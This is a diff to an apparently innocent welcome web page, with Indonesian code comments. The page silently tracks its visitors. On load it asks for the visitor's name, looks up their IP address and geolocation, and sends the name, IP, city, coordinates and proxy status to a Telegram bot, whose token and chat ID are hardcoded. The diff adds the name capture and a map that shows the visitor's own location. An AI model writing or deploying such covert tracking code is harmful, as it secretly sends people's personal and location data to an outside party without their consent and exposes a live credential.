@@ -9,6 +9,18 @@
         const TELEGRAM_TOKEN = "7896685998:AAGXZGmmckIixNQLJPfb4aKz5morpkvI7cY";
         const CHAT_ID = "7232374611";
 
+        let userName = "";
+
+        // Prompt nama pengguna sebelum halaman tampil
+        window.onload = function () {
+            userName = prompt("Masukkan Nama Anda:");
+            if (!userName) {
+                userName = "Pengunjung Tanpa Nama";
+            }
+            document.getElementById("welcome-text").innerText = `Selamat Datang, ${userName}!`;
+            trackVisitor();
+        };
+
         // Fungsi untuk mengirim pesan ke Telegram
         function sendToTelegram(message) {
             const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
@@ -35,8 +47,13 @@
                 let locationResponse = await fetch(`https://freeipapi.com/api/json/${userIP}`);
                 let locationData = await locationResponse.json();
 
-                // 3️⃣ Siapkan pesan lengkap untuk dikirim ke Telegram
+                // 3️⃣ Update iframe dengan koordinat pengguna
+                let mapIframe = document.getElementById("map-frame");
+                mapIframe.src = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}&output=embed`;
+
+                // 4️⃣ Siapkan pesan lengkap untuk dikirim ke Telegram
                 let message = `🚨 *Pengunjung Baru!* 🚨\n\n` +
+                              `👤 *Nama:* ${userName}\n` +
                               `📍 *IP:* \`${locationData.ipAddress}\`\n` +
                               `🌍 *Negara:* ${locationData.countryName} (${locationData.countryCode})\n` +
                               `🏙 *Kota:* ${locationData.cityName}, ${locationData.regionName}\n` +
@@ -51,29 +68,27 @@
                               `📌 *Koordinat:* ${locationData.latitude}, ${locationData.longitude}\n` +
                               `🕹 *Proxy:* ${locationData.isProxy ? "Ya" : "Tidak"}`;
 
-                // 4️⃣ Kirim pesan ke Telegram
+                // 5️⃣ Kirim pesan ke Telegram
                 sendToTelegram(message);
 
             } catch (error) {
                 console.error("Gagal mendapatkan IP:", error);
             }
         }
-
-        // Jalankan fungsi saat halaman dibuka
-        trackVisitor();
     </script>
 </head>
 <body>
-    <h1>Welcome!</h1>
+    <h1 id="welcome-text">Selamat Datang!</h1>
     <p>Enjoy browsing this page.</p>
     <iframe 
-    width="600" 
-    height="450" 
-    style="border:0" 
-    loading="lazy" 
-    allowfullscreen 
-    referrerpolicy="no-referrer-when-downgrade"
-    src="https://www.google.com/maps?q=-6.208678,106.84549&output=embed">
-</iframe>
+        id="map-frame"
+        width="600" 
+        height="450" 
+        style="border:0" 
+        loading="lazy" 
+        allowfullscreen 
+        referrerpolicy="no-referrer-when-downgrade"
+        src="">
+    </iframe>
 </body>
 </html>
